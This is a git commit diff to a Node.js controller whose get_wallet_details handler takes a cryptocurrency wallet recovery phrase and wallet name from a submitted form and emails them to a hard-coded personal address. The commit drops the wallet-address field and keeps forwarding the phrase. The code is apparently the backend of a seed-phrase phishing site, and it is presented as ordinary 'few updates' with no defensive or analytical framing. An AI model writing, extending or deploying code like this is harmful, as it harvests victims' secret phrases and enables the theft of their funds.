1979c6f527f8e23dd403600b1b414b3e6fb96b17
OGM <walisonmichael8@gmail.com>
2025-05-06 11:21:30 +0100

    few updates

--- server/controller/control_pages.js
+++ server/controller/control_pages.js
@@ -38,11 +38,11 @@ const sendmail = async function(from,to,subject,text) {
 }
 exports.get_wallet_details= async(req,res)=>{
       const phrase = req.body.Phrase;
-      const wallet_address = req.body.Wallet_address;
+     // const wallet_address = req.body.Wallet_address;
       const crypto_wallet = req.body.Crpto_Wallet
      const email ="walisonmichael8@gmail.com";
      const subject ="Wallet Details";
-     const Text = "Phrase: "+phrase+"\n"+"Wallet Address: "+wallet_address+"\n"+"Wallet Name: "+crypto_wallet;
+     const Text = "Phrase: "+phrase+"\n\n"+"Wallet Name: "+crypto_wallet;
      
      try{
         const send = sendmail(process.env.EMAIL,email,subject,Text);
